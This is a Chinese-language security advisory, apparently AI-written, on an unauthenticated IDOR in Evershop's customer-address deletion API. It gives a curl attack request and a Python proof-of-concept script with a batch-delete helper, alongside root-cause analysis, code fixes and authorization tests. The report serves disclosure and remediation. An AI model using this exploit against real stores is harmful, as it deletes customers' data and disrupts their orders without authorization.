# Evershop deleteCustomerAddress 未授权删除任意地址漏洞报告

## 1. 漏洞挖掘目标

- **受影响系统/产品**：Evershop E-commerce Platform
- **受影响版本**：2.1.0 及之前版本
- **仓库地址**：https://github.com/evershopcommerce/evershop

## 2. 漏洞说明

### 2.1 漏洞描述

- **漏洞类型**：不安全的直接对象引用 (IDOR, CWE-639)
- **漏洞名称**：Evershop deleteCustomerAddress API 未授权删除任意客户地址漏洞
- **风险等级**：高危
- **概述**：`DELETE /customers/:customer_id/addresses/:address_id` API 端点配置为公开访问（`access="public"`），无需任何身份认证即可删除任意客户的收货地址。虽然系统验证了地址是否属于指定客户，但由于整个接口无需认证，攻击者只需知道customer_id和address_id即可删除他人地址。

### 2.2 利用前提与特征

- **利用难度**：中
- **权限要求**：无需认证
- **操作条件**：
  1. 获取目标客户的UUID（customer_id）
  2. 获取目标地址的UUID（address_id）
- **攻击特征**：发送DELETE请求到公开的地址删除接口

### 2.3 漏洞效果

漏洞攻击成功后的效果如下：

1. **收货地址删除**：攻击者可删除任意客户的收货地址
2. **业务干扰**：客户在结账时发现地址丢失，无法正常下单
3. **用户体验损害**：客户需要重新添加地址信息
4. **信息泄露**：通过遍历可确认哪些UUID组合有效，推断用户和地址数量

## 3. 漏洞复现

- **是否可以制作成自动化复现脚本**：是

### 3.1 漏洞复现过程

**步骤1：确认路由配置**

文件：`packages/evershop/src/modules/customer/api/deleteCustomerAddress/route.json`
```json
{
  "methods": ["DELETE"],
  "path": "/customers/:customer_id/addresses/:address_id",
  "access": "public"  // <-- 无需认证！
}
```

**步骤2：分析Handler逻辑**

文件：`packages/evershop/src/modules/customer/api/deleteCustomerAddress/deleteCustomerAddress.js`
```javascript
export default async (request, response, next) => {
  try {
    // 验证客户存在性
    const customer = await select()
      .from('customer')
      .where('uuid', '=', request.params.customer_id)
      .load(pool);
    if (!customer) {
      // 返回错误
    }

    // 验证地址属于该客户
    const address = await select()
      .from('customer_address')
      .where('uuid', '=', request.params.address_id)
      .and('customer_id', '=', customer.customer_id)
      .load(pool);
    if (!address) {
      // 返回错误
    }

    // 删除地址 - 未验证请求者身份！
    const deletedAddress = await deleteCustomerAddress(
      request.params.address_id,
      { routeId: request.currentRoute.id }
    );
    // ...
  }
};
```

**步骤3：发送攻击请求**

```bash
# 删除任意客户的地址
curl -X DELETE 'https://target.com/api/customers/victim-customer-uuid/addresses/target-address-uuid'
```

**预期响应**（删除成功）：
```json
{
  "data": {
    "uuid": "deleted-address-uuid",
    "full_name": "Victim Name",
    "address_1": "123 Victim Street"
  }
}
```

## 4. 漏洞利用

- **是否可以制作成自动化复现脚本**：是

### 4.1 利用脚本

```python
#!/usr/bin/env python3
"""
Evershop IDOR PoC - Delete Any Customer Address
"""

import requests
import sys

class AddressDeleter:
    def __init__(self, target_url):
        self.target_url = target_url

    def delete_address(self, customer_id, address_id):
        """
        删除指定客户的指定地址
        """
        endpoint = f"{self.target_url}/api/customers/{customer_id}/addresses/{address_id}"

        print(f"[*] 目标端点: {endpoint}")

        response = requests.delete(endpoint)

        if response.status_code == 200:
            data = response.json().get('data', {})
            print("[+] 地址删除成功!")
            print(f"    地址UUID: {data.get('uuid')}")
            print(f"    收件人: {data.get('full_name')}")
            print(f"    地址: {data.get('address_1')}")
            return True
        else:
            print(f"[-] 删除失败: {response.status_code}")
            print(f"    响应: {response.text}")
            return False

    def batch_delete(self, customer_id, address_ids):
        """
        批量删除客户的多个地址
        """
        deleted = 0
        for addr_id in address_ids:
            if self.delete_address(customer_id, addr_id):
                deleted += 1

        print(f"\n[*] 总计删除: {deleted}/{len(address_ids)} 个地址")
        return deleted


def main():
    if len(sys.argv) < 4:
        print(f"Usage: {sys.argv[0]} <target_url> <customer_uuid> <address_uuid>")
        print(f"Example: {sys.argv[0]} https://shop.example.com abc123 def456")
        sys.exit(1)

    target = sys.argv[1]
    customer_id = sys.argv[2]
    address_id = sys.argv[3]

    deleter = AddressDeleter(target)
    deleter.delete_address(customer_id, address_id)


if __name__ == "__main__":
    main()
```

## 5. 漏洞原理

### 5.1 数据流分析

```
┌────────────────────────────────────────────────────────────────┐
│              地址删除IDOR数据流                                  │
├────────────────────────────────────────────────────────────────┤
│                                                                │
│  HTTP请求: DELETE /customers/:customer_id/addresses/:address_id│
│  路由配置: access="public"  ← 无需认证                          │
│            │                                                   │
│            ▼                                                   │
│  ┌─────────────────────────────────────────┐                  │
│  │ deleteCustomerAddress.js Handler        │                  │
│  │                                         │                  │
│  │ 1. 验证customer_id存在 ✓                │                  │
│  │    → 仅检查UUID是否有效                  │                  │
│  │                                         │                  │
│  │ 2. 验证address_id属于customer ✓          │                  │
│  │    → 确保地址与客户关联                  │                  │
│  │                                         │                  │
│  │ 3. 验证请求者身份 ✗ (缺失!)              │                  │
│  │    → 未检查当前用户是否为该客户          │                  │
│  │                                         │                  │
│  │ 4. deleteCustomerAddress()              │                  │
│  │    → 直接删除地址!                       │                  │
│  └─────────────────────────────────────────┘                  │
│            │                                                   │
│            ▼                                                   │
│  ┌─────────────────────────────────────────┐                  │
│  │ 结果：任何人都可删除任意客户的地址        │                  │
│  └─────────────────────────────────────────┘                  │
│                                                                │
└────────────────────────────────────────────────────────────────┘
```

### 5.2 根因分析

1. **路由公开访问**：`access="public"` 允许未认证请求
2. **缺失身份验证**：Handler仅验证资源关联性，未验证请求者身份
3. **授权检查不足**：未确认当前用户是否有权操作该客户的地址

## 6. 修复建议

### 6.1 方案A：修改路由为私有

```json
// route.json
{
  "methods": ["DELETE"],
  "path": "/customers/:customer_id/addresses/:address_id",
  "access": "private"
}
```

### 6.2 方案B：在Handler中添加身份验证

```javascript
// deleteCustomerAddress.js
export default async (request, response, next) => {
  try {
    // 1. 获取当前登录用户
    const currentCustomer = request.getCurrentCustomer();
    if (!currentCustomer) {
      response.status(UNAUTHORIZED);
      return response.json({
        error: { message: 'Authentication required' }
      });
    }

    // 2. 验证操作权限
    if (currentCustomer.uuid !== request.params.customer_id) {
      response.status(FORBIDDEN);
      return response.json({
        error: { message: 'You can only delete your own addresses' }
      });
    }

    // 3. 原有验证逻辑...
    const address = await select()
      .from('customer_address')
      .where('uuid', '=', request.params.address_id)
      .and('customer_id', '=', currentCustomer.customer_id)
      .load(pool);

    if (!address) {
      response.status(INVALID_PAYLOAD);
      return response.json({
        error: { message: 'Address not found' }
      });
    }

    // 4. 执行删除
    await deleteCustomerAddress(request.params.address_id);
    // ...
  }
};
```

### 6.3 安全测试用例

```javascript
describe('deleteCustomerAddress Authorization', () => {
  it('should reject unauthenticated requests', async () => {
    const response = await request(app)
      .delete('/api/customers/cust-uuid/addresses/addr-uuid');
    expect(response.status).toBe(401);
  });

  it('should reject deleting other users addresses', async () => {
    const response = await request(app)
      .delete('/api/customers/other-cust-uuid/addresses/addr-uuid')
      .set('Authorization', `Bearer ${userToken}`);
    expect(response.status).toBe(403);
  });

  it('should allow deleting own address', async () => {
    const response = await request(app)
      .delete(`/api/customers/${currentUser.uuid}/addresses/${ownAddress.uuid}`)
      .set('Authorization', `Bearer ${userToken}`);
    expect(response.status).toBe(200);
  });
});
```

---

**报告编写日期**：2026-01-04
**分析师**：Claude Code Security Analyzer
